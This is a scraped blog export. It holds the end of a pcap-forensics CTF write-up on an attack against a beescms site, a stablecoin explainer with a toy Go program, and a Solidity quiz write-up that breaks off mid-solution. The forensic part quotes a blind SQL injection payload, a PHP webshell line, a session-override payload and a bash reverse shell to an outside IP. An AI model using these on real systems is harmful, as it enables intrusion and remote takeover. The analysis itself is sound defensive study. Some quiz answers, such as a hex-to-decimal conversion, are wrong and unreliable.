在翻看流量时突然有一条针对&#x2F;admin&#x2F;login.php攻击的响应报文长度为796(流量包No.110539)，这就说明这个相应的内容和前面的“输入密码不正确”的回显不同，查看该回显，发现回显内容为“操作数据库失败”，并且跟了SQL的报错信息，里面涉及到了 ‘’admin’’ limit 0,1’ 这样的信息。frame.number&gt;=110500 &amp;&amp; http\n\n根据经验可以判断，这是一个SQL注入攻击相关的信息。 对这条HTTP响应进行追踪HTTP流。\n\n​\t不难看出，这里的user字段的用户名是 admin’，说明此时攻击者已经开始尝试针对后台登陆页面进行SQL注入攻击，并且由于这条语句的回显会显示出SQL的错误信息，对该点进行报错注入攻击是一个存在可行性的选择。​\t在No.110539之后，针对&#x2F;admin&#x2F;login.php的攻击还在持续，但此时的特征和前面不同，从这里开始，攻击报文的数据包长度不再集中于830左右，而是变得更长，这是因为攻击者开始针对登陆页面进行SQL注入攻击。frame.number&gt;=110539 &amp;&amp; http​\t例如No.136278，是在user表单中添加payload\n\n这个payload的目的是通过时间盲注爆破Information_schema数据库中，名称为0x62656573636d73的数据库下的表。\n\n1admin&#x27; RLIKE (SELECT 6348=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x62656573636d73),1,1))&gt;9),SLEEP(5),6348))-- WhBO\n\n\n对0x62656573636d73进行16进制转ASCII字符的操作，可以得到被攻击的数据库名称为beescms。\n​\t可以看到攻击者首先向疑似图片上传点admin_pic_upload.php的url进行了三次POST请求，然后对文件&#x2F;upload&#x2F;img&#x2F;202005081647275585.php进行了GET请求。\n\n​\t根据经验，这个php文件很有可能是攻击者上传的文件，可以查看其内容，发现是phpinfo的内容。\n​\t然后在No.137348流量包处可以看到攻击者再次上传文件，且该文件很明显包含一句话木马。后面紧接着针对该WebShell，即**&#x2F;upload&#x2F;img&#x2F;202005081648075663.php**进行访问。\n\n随后就是利用该Webshell。\n\n接下来在No.137932处有另一个Webshell，index.php的攻击流量。\n\n​\t但这个Webshell又是哪里来的呢？根据我们前面找到的Webshell，可以判断这个index.php是攻击者利用前面的第一个WebShell上传的，那我们就继续往前找一下。​\t可以关注&#x2F;upload&#x2F;img&#x2F;202005081647275585.php相关的POST请求。http.request.uri contains&quot;202005081648075663.php&quot; &amp;&amp; http.request.method == POST\n\n我们可以从No.137386之后的数据包开始检查。检查时可以查看各响应数据包的内容，判断上一个请求报文的行为。frame.number&gt;=137386 &amp;&amp; http例如No.137421这个响应返回了pwd和其他系统相关信息。\n\n​\t此后攻击者分别通过该Webshell执行了ifconfig、ls -al、id等命令，这里不一一列举。之后在No.137522这条流量中发现了攻击者上传恶意脚本的信息。此时分析一下202005081647275585.php的使用方法。\n\n​\t首先通过fff参数上传恶意PHP代码，让WebShell执行代码内容。\nNo.137522的执行内容是，将POST参数”zb0c10b259c5be”的值，经过base64解码，得到恶意文件内容；将POST参数”y028ed8f4232d6”的值，经过base64编码，作为恶意文件的路径，然后将恶意文件内容存放到恶意文件路径中。\n​\t补对y028ed8f4232d6的值进行base64解码得到：L3Zhci93d3cvaHRtbC9pbmRleC5waHA=/var/www/html/index.php\n对zb0c10b259c5be的值进行base64解码可以得到index文件，但在文件中被插入了以下Webshell（篇幅所限，这里不给出全部解码结果）：@$_POST[&#39;lang&#39;]($_GET[&#39;cmd&#39;]);    明显可以看出，网站首页index.php已经被篡改，在最后插入了异常代码，该代码主要用于传参，将GET方法传入的参数，作为POST方法传入的函数的参数。在No.137932处可以看到攻击者利用index.php执行了ls命令。\n\n在No.138043处可以看到攻击者利用Webshell进行了反弹shell\n\nPOST /index.php?cmd=bash -i &gt;&amp; /dev/tcp/120.79.139.46/8864 0&gt;&amp;1 HTTP/1.1\\r\\n\n反弹shell的外联地址为120.79.139.46:8864至此，分析结束。\n答案总结1.攻击者的IP地址为？\n答案：172.17.0.1\n2.网站的后台管理员登陆界面的URL是？\n答案：&#x2F;admin&#x2F;login.php\n3.网站数据库的名称为？\n答案：beescms\n4.网站后台管理员admin的登陆密码哈希值为？\n答案：f0d123bf4cccb5c9b8dbbcf532fd8cc0\n5.黑客进入后台使用的漏洞是？Payload是？\n答案：通过变量覆盖漏洞，payload如下: \n_SESSION [ login_in ]&#x3D; 1 &amp; _SESSION [ admin ]&#x3D; 1 &amp; _SESSION [ login_time ]&#x3D; 99999999999\n6.黑客通过什么Web攻击方法获得系统权限？\n答案：文件上传\n7.黑客上传的Webshell文件名是？\n答案： 202005081648075663.php 和 index.php \n8.黑客最后上传的Webshell在使用时需要接收的参数是？\n答案：index.php接受lang和cmd参数，分别通过POST和GET⽅法\n9.黑客的远程服务器IP地址是？\n答案：120.79.139.46\n","url":"2025/04/26/流量分析题解2/","date":"2025-04-26"},{"title":"稳定币","content":"\n\n启程：走近稳定币世界2024年7月，香港金管局公布首批三家”沙盒”参与机构，京东数科旗下公司等入选。2025年5月，香港立法会通过《稳定币条例草案》，飞速进步和不断跨越，标志着我国在稳定币监管领域取得重要突破。\n\n稳定币成功的关键是什么\n\n\n的确，在数字经济高速发展的今天，虚拟资产逐渐走入大众视野。但价格的剧烈波动却限制了它们在实际支付、跨境结算、金融产品等领域的应用。\n尤其是在电商领域，京东这样的大型平台也在探索区块链技术的落地，但受限于数字货币的不稳定性，其在支付链路中的使用仍面临诸多挑战。 正是在这种背景下，稳定币（Stablecoin）应运而生，成为连接传统金融与区块链世界的重要桥梁。\n\n\n 初识：稳定币到底是什么？定义在理想状态下，稳定币是一种价值稳定的加密货币。\n它继承了比特币所有的核心优势——如去中心化、安全性和全球流通性，同时避免了价格剧烈波动的缺点。这种特性使稳定币更适合承担货币的三大职能：可靠的价值储存手段、高效的交易媒介以及稳定的计价单位。\n稳定币通常锚定某种现实世界货币，如“1枚稳定币 ≈ 1美元”。但他不是现实发售的货币，而是运行在链上的虚拟货币。\n同时它也不是凭空出现的资产，而是依靠技术可信“发行”的数字货币。这些与美元1:1锚定的数字货币能够有效规避市场波动风险。\n\n在数字货币交易中，稳定币扮演着重要的桥梁角色。用户通常会先在交易所（功能类似于传统银行）用法币（如人民币）购买稳定币（如USDT），完成这一兑换后，用户便可利用持有的稳定币自由地交易比特币等其他加密货币。\n这种”法币→稳定币→加密货币”的三段式操作流程，不仅降低了汇率波动带来的资产风险，也为投资者提供了更灵活的资金管理方式，已成为当前数字货币交易市场的标准操作范式。\n\n或者我们可以想像加密货币交易市场是一个大“赌场”，我们可以在这个“赌场”进行下注，预测币价的上涨或下跌，而稳定币便是我们手中的筹码。\n\n特点稳定币有如下6个特点：\n\n价格稳定性：通过锚定资产、算法调控或混合机制，稳定币能有效控制价格波动。\n高流动性：既可在链上自由转移，也能快速兑换为法币或其他加密资产。\n\n\n流动性高的主要原因是因为法币兑换渠道成熟，交易所、OTC平台、支付网关均提供即时兑换服务。譬如用户A在以太坊链上持有USDT（最常见的稳定币之一），可以直接通过钱包转账给用户B（跨境支付或交易），几分钟内完成，手续费极低（相比银行转账）。\n\n\n透明性与可审计性：大多数稳定币项目通常提供链上数据或链下储备证明（Proof-of-Reserves）定期披露储备证明，并接受审计。\n去中心化与合规性兼容：不同类型的稳定币在去中心化程度与合规要求之间寻找平衡。\n链上发行、可编程性：多数稳定币通过智能合约部署在以太坊（如USDC、DAI）、Tron（如USDT-TRC20）等公链上，具备可编程金融属性。\n\n\n可编程金融属性（Programmable Finance）指的是通过智能合约（Smart Contracts）和去中心化协议，将传统金融的逻辑、规则和流程以代码的形式嵌入区块链网络，从而实现金融业务的自动化、透明化和无需信任化\n\n\n\n合约自动清算机制：抵押型稳定币和算法型稳定币通过链上合约实现清算、增发、赎回等功能。\n\n\n下文“稳定币的底层原理”部分有关于的维持平衡（稳定性），抵押型稳定币和算法型稳定币的详细说明\n\n\n乱世求稳：稳定币的”进化之路”稳定币的起源可以追溯到2014年，当时 Tether 公司率先发行了广为人知的 USDT （泰达币），成为首个与美元1:1锚定的数字货币。 USDT 的发行标志着稳定币市场的开端，随后其他稳定币也开始涌现，逐渐成为加密货币市场中不可或缺的工具。\n2018年，由于 Tether 公司未能及时公开审计报告，引发市场信任危机，导致 USDT 价格剧烈震荡。其中，2018年8月6日，USDT 兑美元汇率一度跌至0.94美元的历史低点。但随着市场恐慌情绪缓解，抛售压力减弱，USDT 价格逐步回升并恢复稳定。\n到了2020年，全球稳定币的总市值仅为200亿美元，反映着当时这一领域仍处于早期发展阶段，市场潜力尚未完全释放。\n但自2020年起，稳定币市场进入了高速增长阶段。\n到2025年5月，全球稳定币市值已经飙升至2500亿美元，五年间实现了惊人的11倍增长。这一扩张速度远远超过传统金融工具，稳定币从边缘创新迅速蜕变为金融基础设施的核心支柱。\n\n核心秘密：稳定币是如何“炼”成的？稳定币的稳定性，得益于区块链技术的底层支撑。\n稳定币的每一个操作和记录都可以在链上溯源，公开透明，这也提高其透明性，可审计性，也能减少交易时间与成本，更快速且更便宜地达成交易。   \n\n稳定币如何“稳定”稳定币通过将其价格与某种稳定的资产挂钩来实现其稳定性，例如美元、黄金或其他加密货币。常见的稳定币类型包括法币抵押型、加密资产抵押型以及算法调节型。\n  \n\n1. 法币抵押型稳定币（最常见）原理：这类稳定币就像我们银行账户里的数字美元（或数字人民币）。发行方在银行里存了真实的美元，然后按 1:1 的比例发行对应数量的稳定币。比如，你给我 1 美元，我就给你 1 个稳定币；你把 1 个稳定币还给我，我就退你 1 美元。例子：USDT (泰达币) 和 USDC (美元币) 就是最常用的两种，它们都宣称自己有等值的美元储备。优点：最简单，最稳定，被广泛接受。缺点：用户需自主判断发行方的信任证明机制，避免超额发行或挪用风险。\n  \n\n2. 加密货币抵押型稳定币原理：这种稳定币没有人来存美元，而是通过抵押其他加密货币来发行。比如，你想生成 100 美元的稳定币，你可能需要抵押 150 美元的以太坊。之所以要多抵押一些，是为了防止以太坊价格下跌时，你的抵押物不够用。（一定要超额抵押）例子：DAI (代币)优点：更去中心化，不依赖某个公司。缺点：机制复杂一些，而且如果抵押的加密货币价格暴跌，也有风险。\n\n\n\n\n\n\n3. 算法稳定币（风险较高，一般不推荐新手触碰）原理：这种稳定币不靠任何抵押物，而是靠一套智能合约算法来调节供应量，以维持价格稳定。当稳定币价格高了，算法就多发行一些；价格低了，算法就回收一些。例子：曾经的 UST 就是一个算法稳定币，但后来崩盘了，导致很多人亏钱。优点：理论上最去中心化，但实际操作中风险非常大。缺点：极其脆弱，一旦市场恐慌或算法失灵，很容易彻底崩溃。  \n\n\n 基于算法的稳定币AMPL的Rebase（弹性供应）机制，其核心是通过自动调整供应量来维持1 AMPL ≈ 1美元的稳定性。具体分为以下两种情况：\n\n当价格高于1美元时（如1 AMPL &#x3D; 2美元）  \n\n系统会增发AMPL给持有者（例如原持有1 AMPL变为2 AMPL）。  \n增发后，单个AMPL的价值回落至1美元（图中“2 AMPL &#x3D; $2，每个价值1美元”）。  \n这一过程吸引更多买家（DEMAND），推动需求增长（&gt;$1009可能指市值或交易量）。\n\n\n当价格低于1美元时（如1 AMPL &#x3D; 0.5美元）  \n\n系统会收缩供应量，持有者的AMPL数量减少（例如原持有1 AMPL变为0.5 AMPL）。  \n收缩后，单个AMPL的价值回升至1美元（图中“0.5 AMPL &#x3D; $0.5”）。  \n价格下跌会抑制需求（&lt;$1009）。\n\n\n\n总结：AMPL通过Rebase机制动态调整供应量，利用市场供需关系将价格锚定1美元，无需抵押资产，完全依赖算法调控。\n\n原理的代码实现举例GO语言实现（法币储备型稳定币模拟系统）：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108package mainimport (    &quot;errors&quot;    &quot;fmt&quot;    &quot;sync&quot;)type Stablecoin struct &#123;    Name        string    Symbol      string    TotalSupply uint64    MaxSupply   uint64    Owner       string    Balances    map[string]uint64    mu          sync.Mutex&#125;// 创建新稳定币实例func NewStablecoin(name, symbol, owner string, initialSupply, maxSupply uint64) *Stablecoin &#123;    sc := &amp;Stablecoin&#123;        Name:        name,        Symbol:      symbol,        Owner:       owner,        TotalSupply: 0,        MaxSupply:   maxSupply,        Balances:    make(map[string]uint64),    &#125;    sc.mint(owner, initialSupply) // 初始化分配    return sc&#125;// 仅管理员可以调用的铸币函数func (sc *Stablecoin) mint(to string, amount uint64) error &#123;    sc.mu.Lock()    defer sc.mu.Unlock()    if sc.TotalSupply+amount &gt; sc.MaxSupply &#123;        return errors.New(&quot;max supply exceeded&quot;)    &#125;    sc.Balances[to] += amount    sc.TotalSupply += amount    return nil&#125;// 销毁稳定币（如用户赎回）func (sc *Stablecoin) burn(from string, amount uint64) error &#123;    sc.mu.Lock()    defer sc.mu.Unlock()    if sc.Balances[from] &lt; amount &#123;        return errors.New(&quot;insufficient balance to burn&quot;)    &#125;    sc.Balances[from] -= amount    sc.TotalSupply -= amount    return nil&#125;// 用户转账func (sc *Stablecoin) transfer(from, to string, amount uint64) error &#123;    sc.mu.Lock()    defer sc.mu.Unlock()    if sc.Balances[from] &lt; amount &#123;        return errors.New(&quot;insufficient balance&quot;)    &#125;    sc.Balances[from] -= amount    sc.Balances[to] += amount    return nil&#125;// 查询余额func (sc *Stablecoin) balanceOf(user string) uint64 &#123;    sc.mu.Lock()    defer sc.mu.Unlock()    return sc.Balances[user]&#125;// 测试用例func main() &#123;    admin := &quot;admin&quot;    user := &quot;alice&quot;    // 初始化一个最大供应 1,000,000 的稳定币    sc := NewStablecoin(&quot;Simple USD&quot;, &quot;sUSD&quot;, admin, 100_000, 1_000_000)    // 管理员铸币    if err := sc.mint(user, 5000); err != nil &#123;        fmt.Println(&quot;Mint error:&quot;, err)    &#125;    // 转账    if err := sc.transfer(user, &quot;bob&quot;, 2000); err != nil &#123;        fmt.Println(&quot;Transfer error:&quot;, err)    &#125;    // 销毁    if err := sc.burn(user, 1000); err != nil &#123;        fmt.Println(&quot;Burn error:&quot;, err)    &#125;    // 查询余额    fmt.Printf(&quot;Alice Balance: %d sUSD\\n&quot;, sc.balanceOf(user))    fmt.Printf(&quot;Bob Balance: %d sUSD\\n&quot;, sc.balanceOf(&quot;bob&quot;))    fmt.Printf(&quot;Total Supply: %d sUSD\\n&quot;, sc.TotalSupply)&#125;\n\n\n代码中的方法介绍\n\n\n模块\n功能说明\n\n\n\nmint()\n模拟后台托管系统给用户铸币，仅 owner 可调用\n\n\nburn()\n用户赎回法币时销毁稳定币\n\n\ntransfer()\n用户之间的转账\n\n\nbalanceOf()\n查询任意地址的余额\n\n\n并发锁 sync.Mutex\n确保并发调用安全性\n\n\n\n无处不在：稳定币如何改变我们的数字生活？\n1. 网上购物的“数字支付工具”想象一下，你平时在京东、淘宝买东西，用微信或支付宝支付。未来，稳定币也能做到。\n\n怎么用？ 电商网站可以在他们的支付系统里，直接加上一个用稳定币收款的功能。你点付款的时候，选择用 USDC 或者 USDT ，就像扫码付款一样，直接把稳定币转过去就行。像美国的一些大型电商平台，比如 Overstock，就允许顾客用稳定币支付。\n有什么好？ 支付过程可能更快，手续费更低。而且，如果电商平台想，他们可以直接拿着你的稳定币，不用马上换成人民币，等需要用法币的时候再换。这样可以减少中间环节的费用。 这为电商平台提供了更多的支付选择和资金管理灵活性。\n未来升级： 就像 Layer 2（扩容高架桥），比起传统支付面临网络拥堵的问题，稳定币支付还可以走这些“高架桥”，让支付速度更快，效率更高。\n\n\nLayer 2（L2） 是建立在区块链主网（如以太坊，即 Layer 1）之上的扩容技术。你可以把 区块链主网（Layer 1） 比作一条只有一条车道的繁忙高速公路，而 Layer 2 就是在旁边修建的多车道，用来分流车辆，提高通行效率。\n\n2. 去中心化金融（DeFi）的“血液”还记得我们说的区块链是个公开账本吗？在区块链上，有一类叫做 DeFi（去中心化金融）的特殊银行和金融服务。稳定币就是这些“数字银行”里流动的“血液”。\nDeFi就是一套用代码代替银行的金融系统。简单说，DeFi就像金融界的无人超市——方便又便宜，但货架塌了得自己扛。\n\n衡量价值： 你看足球比赛，比分用“进球数”来衡量。在 DeFi 里，很多时候资产的价值就用稳定币来衡量。比如，我们常说的 ETH&#x2F;USDC 交易对，就是用 USDC 来给以太坊（ETH）定价。\n借钱和放贷： 你可以把稳定币存到 DeFi 平台里，给别人借钱，然后赚利息；或者用自己的其他数字资产作抵押，从平台里借出稳定币。稳定币的稳定价格让这些借贷变得更可靠。\n提高资金效率： 有些平台专门设计来让不同稳定币之间互相兑换更便宜、更快速（比如 Curve 这样的平台），这能让资金在数字世界里流转得更顺畅、更有效率。\n\n3. 跨链流通的“通行证”现在的区块链世界就像有很多个独立的国家，每个国家都有自己的货币。稳定币就像一张“通用通行证”，可以在不同的“国家”（区块链）之间流通。\n\n多地发行： 大多数主流稳定币，比如 USDT 和 USDC，不只在一个区块链上发行，它们在以太坊、波场、Solana 等多个区块链上都有自己的“版本”。\n跨链桥： 如果你想把以太坊上的稳定币，转到波场上的稳定币，就需要通过“跨链桥”这个工具。它就像一座连接不同国家的桥梁，让你能把资产从一个区块链安全地转移到另一个区块链。\n\n国内应用实例 —— sHKD譬如本文开头所提，京东币链科技（Coinlink）在香港推出的 HKD稳定币项目。\n\n京东科技集团旗下的子公司——京东币链科技（香港）有限公司（JINGDONG Coinlink Technology Hong Kong Limited），正在香港推出一款锚定港元的法币储备型稳定币，币值与港元以 1:1 比例锚定。\n该项目已进入第二阶段测试，定位于跨境支付、零售支付、投资结算和供应链金融等领域。\n\n\n京东币链科技推出的 sHKD 项目，作为香港本地稳定币的重要探索者之一，融合了合规、技术与商业场景的多重优势。\n它不仅支持京东内部业务生态，也将服务于更广泛的跨境电商、金融科技、Web3 应用领域。随着香港加快数字金融监管布局，sHKD 有望成为东亚地区首批落地的合规型法币稳定币典范。\n4. 应对风险的“保险箱”这个我们之前也提到了，但它的重要性值得再强调。\n\n规避波动： 当比特币、以太坊这些加密货币价格像坐过山车一样剧烈波动时，很多人会把它们兑换成稳定币。\n像“现金”一样： 这就像你在股市大跌的时候，把股票卖掉，把钱放到银行卡里，等待市场好转再入场一样。稳定币这时候就扮演了“数字现金”或者“避险资产”的角色，帮你锁定收益或减少损失。\n\n硬币背面：稳定币的挑战与隐忧稳定币听起来很美好，但要真正实现“全球数字现金”这个宏大愿景，它还有两大“拦路虎”要解决：隐私保护和可扩展性。\n理想的数字货币，应该能做到交易飞快、手续费超低、而且还能保护你的隐私。目前看来，稳定币在这几方面还没完全达标。\n\n\n1. 隐私保护：谁想让自己的银行流水被所有人看到？这是稳定币能否被大家广泛接受的关键。咱们平时用银行卡、支付宝、微信支付，虽然商家知道你的交易，但你的所有交易记录不会被全世界的人看到。\n但区块链的特点是公开透明，所有交易都会被记录在一个大家都能看的账本上\n虽然你的区块链地址是匿名的（就像一个银行账号，大家不知道它是谁的），通过分析链上的交易数据，或者直接通过区块链浏览器（一种查询链上交易的工具）查找，任何人都可以追踪到你的交易路径，甚至找出你和谁在交易。\n咱们普通人可能觉得无所谓，但想想企业、政府和金融机构，他们进行商业往来时，肯定希望自己的交易信息是保密的，不想让竞争对手或外人一览无余。\n而且可以想象一下，你口袋里有100块钱，我口袋里也有100块钱，它们是等价的，可以互相替换。这就是“可替代性”。但如果区块链上的每一笔钱都被人知道它曾经去过哪，被谁用过，使得每一笔钱不再是一个抽象的、无差别的价值单位，而变成了一个带有“身份”和“历史”的实体。\n这个“身份”和“历史”会影响人们对它的价值判断、信任程度和使用范围，从而导致不同“身份”的钱之间出现了价值或功能上的差异，最终破坏了可替代性的基础——即“等价”和“无条件可接受”。\n\n2. 可扩展性：既要快、要便宜，又要兼顾去中心化和安全，太难了！咱们前面讲过 Layer 1 和 Layer 2，就是为了解决速度慢和费用高的问题。但稳定币要实现真正的可扩展性，还得同时兼顾隐私（比如企业不想交易完全透明）和合规（比如反洗钱的要求），这可太难了。\n\n速度和成本限制： 大多数稳定币，比如 USDT 和 USDC，都是运行在以太坊这类公链上的。这些公链就像是主干道，虽然安全，但交易处理速度有限，而且高峰期手续费会很高。这就像一条路太窄，车太多，就会堵车，过路费也贵。\n多链部署和碎片化： 稳定币为了提升交易效率，通常会在多条区块链（比如以太坊、波场、Solana等）上同时发行，这就像在多个城市之间修建了不同的高速公路。\n\n但这种方式也带来了两个主要问题：首先，当用户需要把稳定币从一条链转移到另一条链时，必须依赖”跨链桥”技术，这些桥梁不仅技术复杂，还存在安全隐患，历史上就发生过多次跨链桥遭黑客攻击导致巨额资产被盗的事件。\n其次，当资产跨多链发行时，资金和流动性会被分散，导致单链交易深度下降、效率降低，并影响整体市场的流动性和价格一致性。就像大河分流成多条小溪，每条小溪的水流都变弱了。\n\n3. 摆脱“锚定”的诱惑：但路漫漫其修远兮理论上，如果一个稳定币被大家普遍接受，都用它来支付和结算，形成了一个自己的小生态，那它可能就不需要完全依赖外部的美元或其他资产来维持稳定了。\n它自身的“被广泛使用”就成了它价值稳定的基础，就像现实中的人民币或美元一样，大家相信它有价值，它就有价值。\n\n挑战巨大： 要实现这个愿景，需要非常漫长且艰巨的市场培育过程。大家得真的愿意用它来买卖东西，而不是只把它当成在加密货币之间切换的工具。\n算法稳定币的警示： 特别是那些没有真实资产支撑的算法稳定币，它们想通过算法来保持稳定。但历史告诉我们，这种方式非常脆弱，一旦市场信心动摇，就可能彻底崩盘。建立用户对这类稳定币的信任，将是巨大的挑战。\n\n结语很多人通常认为，稳定币就是美元的“完全替代品”，但实际情况是，稳定币只是被设计成其价格大致围绕美元波动。\n即使是那些背后有足够抵押物支持、且可以随时兑换的稳定币，它们的市场价格也未必总是严格等于美元——这会受到市场供需变化和交易对手风险等因素的影响。\n\n因此，要让稳定币真正发挥作用，用户应当不再把它看作和美元等值的“影子美元”，而是将其视为一种相对独立的资产，使这种资产通过抵押机制、市场激励和对未来价格的预期，始终尽可能接近美元价值。\n这意味着，稳定币即使未能完全维持与美元的严格挂钩，也有可能提供足够的价格稳定性。\n实际上，随着围绕稳定币本身形成经济活动（如支付、结算、储值等），是否完美“挂钩”反而变得不再那么重要。\n只要大家愿意收取并持有这种稳定币，并且也用它去支付上游供应商费用，同时这种稳定币在市场中广泛流通，它就可以很好地发挥“稳定”的作用，即便价格偶尔偏离1美元也无伤大雅。\n\n稳定币的出现，标志着区块链从“技术试验”向“金融基础设施”迈出关键一步。从底层合约设计、抵押机制，到预言机集成与清算流程。\n稳定币是当前区块链系统中技术最为复杂、使用最为广泛的核心模块之一。未来，随着合规化与跨链技术的进一步完善，稳定币将有望成为高效、安全、智能的支付工具。\n\n\n免责声明：以上内容仅供讨论交流，不构成任何投资建议。\n\n","url":"2025/07/01/稳定币（Stablecoin）：数字经济时代的价值锚/","date":"2025-07-01"},{"title":"记一次题解","content":"第一题有无除了直接点击deploy外的其他方法部署一个合约\n第一题题解create和create2\n第二题简单说说怎样优化一下这个私人金库合约\n1234567891011121314151617181920212223242526// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;    address public owner;    receive() external payable &#123;        // just a receive function    &#125;    function deposit() external view payable &#123;        require(msg.value &gt; 0, &quot;Must send some ether&quot;);        // code? what code?    &#125;    function getBalance() internal view returns (uint) &#123;        return address(this).balance;        // oh i don&#x27;t want you get balance    &#125;    function withdraw(uint amount) external &#123;        require(amount &lt;= address(this).balance, &quot;Insufficient balance&quot;);        // okay okay, let&#x27;s withdraw        payable(owner).transfer(amount);    &#125;&#125;\n\n第二题题解123456789101112131415161718192021222324252627282930313233// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;    address public owner;    constructor() &#123;        owner = msg.sender;    &#125;    receive() external payable &#123;        // 接收ETH的函数    &#125;    // 存款函数，允许用户向合约发送ETH    // 不用限制调用者，多来点何乐而不为    function deposit() external payable &#123;        require(msg.value &gt; 0, &quot;Must send some ether&quot;);    &#125;    // 获取合约余额，可以被外部调用，不想别人看见应该限制msg.sender    function getBalance() external view returns (uint) &#123;        require(msg.sender == owner, &quot;Only owner can view balance&quot;);        return address(this).balance;    &#125;    // 提款函数，只有所有者可以调用    function withdraw(uint amount) external &#123;        require(msg.sender == owner, &quot;Only owner can withdraw&quot;);        require(amount &lt;= address(this).balance, &quot;Insufficient balance&quot;);        payable(owner).transfer(amount);    &#125;&#125;\n\n\n\n改进点主要在于以下几点：\n1. owner 的设置\n代码一: owner 地址没有在构造函数中显式设置，可能是在部署合约后手动设定或假设默认是部署者的地址（但这部分不明确，可能存在漏洞）。\n代码二: 在构造函数中显式设置 owner = msg.sender;，确保合约的所有者是部署合约的人，避免了潜在的漏洞。\n\n2. getBalance 的访问限制\n代码一: getBalance 函数是 internal，意味着只有合约内部或者继承的合约可以调用，而不能直接由外部调用。没有任何访问控制。\n代码二: getBalance 函数是 external，并且增加了访问控制：require(msg.sender == owner, &quot;Only owner can view balance&quot;);，只有合约所有者可以查看合约的余额，增强了安全性。\n\n3. withdraw 的访问控制\n代码一: withdraw 函数没有访问控制，任何人都可以调用它进行提款。\n代码二: withdraw 函数增加了访问控制：require(msg.sender == owner, &quot;Only owner can withdraw&quot;);，只有合约所有者才能提款，增强了合约的安全性。\n\n4. deposit 函数的调用者限制\n代码一: deposit 函数允许任何人向合约发送ETH，没有限制谁可以调用这个函数。\n代码二: deposit 函数允许任何人调用，并没有限制，注释提到“多来点何乐而不为”，即对存款没有限制。虽然没有直接限制，但存款逻辑在两个合约中是一样的。\n\n5. 合约注释\n代码二: 注释比代码一更详细，解释了各个函数的作用和潜在的修改建议。例如，注释指出存款函数不需要限制调用者，余额函数应限制访问等，增强了代码可读性和文档化。\n\n总结：\n代码二\n 基于代码一添加了更严格的安全控制：\n\n显式设置 owner；\n对 getBalance 和 withdraw 函数添加了所有者权限控制（external）；\n详细的注释和更好的文档化；\n对合约逻辑没有大的改动，但增加了安全性。\n\n\n\n第三题（类型转换）这是一道类似于填空题，只要你输入正确的b,b1,c,d,e;就能将flag变为true，你能获得几个flag呢；(本题不用进行合约交互)；\n123456789101112131415161718192021222324252627282930313233343536373839404142434445//SPDX-License-Identifier: MITpragma solidity^0.8.0;contract easy&#123;bool public flag1 = false;bool public flag2 = false;bool public flag3 = false;bool public flag4 = false;bool public flag5 = false;bytes2 a = 0x1234;uint16 b = uint16(a);uint32 b1 = uint16(a);uint32 c = uint32(bytes4(a));uint8 d = uint8(uint16(a));uint8 e = uint8(bytes1(a));function easy1( uint16 _b) public &#123;\tif(b == _b)\t\tflag1 = true;\telse\t\tflag1 = false;&#125;function easy2( uint32 _b1) public &#123;\tif(b1 == _b1)\t\tflag2 = true;\telse\t\tflag2 = false;&#125;function easy3( uint32 _c) public &#123;\tif(c == _c)\t\tflag3 = true;\telse\t\tflag3 = false;&#125;function easy4( uint16 _e) public &#123;\tif(d == _d)\t\tflag4 = true;\telse\t\tflag4 = false;&#125;function easy5( uint16 _e) public &#123;\tif(e == _e)\t\tflag5 = true;\telse\t\tflag5 = false;&#125;\n\n第三题题解十六进制：\nb1 &#x3D; 0x00001234\n c &#x3D; 0x12340000\n d &#x3D; 0x34\n e &#x3D; 0x12\n十进制：\nb1 &#x3D; 4660\nc &#x3D; 305419896\nd &#x3D; 52\ne &#x3D; 18\n第四题4.众所周知，solidity没有浮点数，那么当我想要在部署合约时带0.1 ether，应该怎么做呢\n【1】\n第四题题解\n点击右侧的ether，换成其他单位进行转换传入即可。\n部署一个合约传入1ether，再通过代码转也可以。\n\n第五题5.说说有几种方式能让这个合约拥有余额\n1234567891011121314151617181920212223242526// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Transfer &#123;    // Mapping to store player balances    mapping(address =&gt; uint256) public player;    // Function to deposit Ether into the contract    function deposit() external payable &#123;        player[msg.sender] += msg.value;    &#125;    // Function to withdraw Ether from the contract    function withdraw(uint256 amount) external payable &#123;        // Ensure the sender has enough balance to withdraw the specified amount        require(player[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);        player[msg.sender] -= amount;        // Transfer the amount back to the sender        payable(msg.sender).transfer(amount);    &#125;    // Fallback function to accept Ether    receive() external payable &#123;&#125;&#125;\n\n\n\n第五题题解：1.EOA账户直接点击deposit进行操作\n2.通过另一个合约调用转账函数转账(transfer,call,send,delegatecall)\n3.自毁合约转账\n注意withdraw并没有真的转账，所以通过接收合约的receive或者fallback函数再次调用deposit不可行\n第六题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// 合约地址: 0xD7e21bfaa70e885AEc831334E2DdD8a052db777b// 测试网：Sepolia// 考察点：一般的代码阅读能力// 题目背景：小明是一个数学爱好者，他比较喜欢将8个较大素数作为自己的密码来存储// 备注：把除去最大的两个素数的其它较大八个素数从小到大排序即可contract ArrayMapping &#123;    // Mapping to store valid numbers    mapping(uint8 =&gt; bool) public numberMapping;    // Mapping to track addresses with the &quot;flag&quot;    mapping(address =&gt; bool) public flag;    // Constructor to initialize the mapping with the provided numbers    constructor(uint8[] memory numbers) &#123;        for (uint i = 0; i &lt; numbers.length; i++) &#123;            numberMapping[numbers[i]] = true;        &#125;    &#125;    // Function to set the flag if the provided numbers are valid    function getflag() public &#123;        attackexample attack = attackexample(msg.sender);        uint8[] memory nums = attack.getNumbers();        // Check if any number in the provided array is in the mapping        require(isInArray(nums), &quot;You can&#x27;t do this&quot;);        flag[address(msg.sender)] = true;    &#125;    // Function to check if any number in the input array exists in the mapping    function isInArray(uint8[] memory numbers) public view returns (bool) &#123;        for (uint i = 0; i &lt; numbers.length; i++) &#123;            if (numberMapping[numbers[i]]) return true;        &#125;        return false;    &#125;&#125;contract attackexample &#123;    uint8[] public numbers;    // Function to return the numbers array    function getNumbers() public view returns (uint8[] memory) &#123;        return numbers;    &#125;    // 在此填写你的攻击合约内容    // Paste your attack code here&#125;\n\n第六题题解：123456789101112131415161718192021222324252627282930313233pragma solidity 